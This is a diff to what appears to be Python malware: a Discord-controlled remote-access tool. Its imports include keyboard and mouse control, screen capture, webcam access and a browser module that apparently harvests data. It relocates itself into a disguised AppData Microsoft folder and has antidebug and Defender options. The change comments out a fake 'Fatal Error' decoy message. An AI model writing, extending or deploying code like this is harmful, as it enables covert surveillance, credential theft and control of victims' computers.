@@ -2,7 +2,7 @@ import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, 
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
 import cv2
-from tkinter import messagebox
+#from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
 from modules.browser import run, delete_files
@@ -72,11 +72,11 @@ if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\Micr
     move()
 
 
-def error():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
+#def error():
+#    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
     
-if ERROR:
-    error_t = threading.Thread(target=error).start()
+#if ERROR:
+#    error_t = threading.Thread(target=error).start()
 
 
 login = os.getlogin()
